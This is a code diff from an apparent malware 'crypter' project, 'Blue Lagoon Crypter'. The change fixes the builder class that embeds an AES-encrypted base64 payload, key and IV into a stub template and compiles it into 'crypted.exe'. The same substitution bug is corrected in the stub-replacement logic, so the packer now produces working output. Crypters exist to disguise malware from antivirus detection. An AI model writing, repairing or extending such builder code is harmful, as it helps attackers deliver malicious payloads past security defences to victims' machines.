@@ -12,33 +12,22 @@ namespace Blue_Lagoon_Crypter__Windowed_.Tools
     {
         private byte[] Key;
         private byte[] IV;
-        private string base64;
-        public string Base64
-        {
-            set
-            {
-                base64 = value;
-            }
-            get
-            {
-                return base64;
-            }
-        }
+        private byte[] Base64;
 
         string Stub = Resources.Stub;
 
         private List<string> replacementLog = new List<string>(); // List to store replacement information
 
-        public Compiler(string inputbase64, string key, string iv)
+        public Compiler(string base64Aes, string key, string iv)
         {
             this.Key = Convert.FromBase64String(key);
             this.IV = Convert.FromBase64String(iv);
-            this.Base64 = Convert.ToString(inputbase64);
+            this.Base64 = Convert.FromBase64String(base64Aes);
 
             // Log key, IV, and base64 data
             LogData("Key", Key);
             LogData("IV", IV);
-            LogData("Base64", Convert.FromBase64String(base64));
+            LogData("Base64", Base64);
 
             SetSettings();
         }
@@ -71,7 +60,7 @@ namespace Blue_Lagoon_Crypter__Windowed_.Tools
                 // Log the replacements made in the Stub string
                 LogReplacements();
 
-                Stub = Stub.Replace("%KEY%", Convert.ToBase64String(Key)).Replace("%IV%", Convert.ToBase64String(IV).Replace("%BASE64%", Convert.ToString(Base64)));
+                Stub = Stub.Replace("%BASE64%", Convert.ToBase64String(Base64)).Replace("%KEY%", Convert.ToBase64String(Key)).Replace("%IV%", Convert.ToBase64String(IV));
             }
             catch (Exception e)
             {
@@ -117,7 +106,7 @@ namespace Blue_Lagoon_Crypter__Windowed_.Tools
                     CompilerParameters compilerParam = new CompilerParameters(referencedAsm)
                     {
                         GenerateExecutable = true,
-                        OutputAssembly = "blc.exe",
+                        OutputAssembly = "crypted.exe",
                         CompilerOptions = compileOptions,
                         TreatWarningsAsErrors = true
                     };
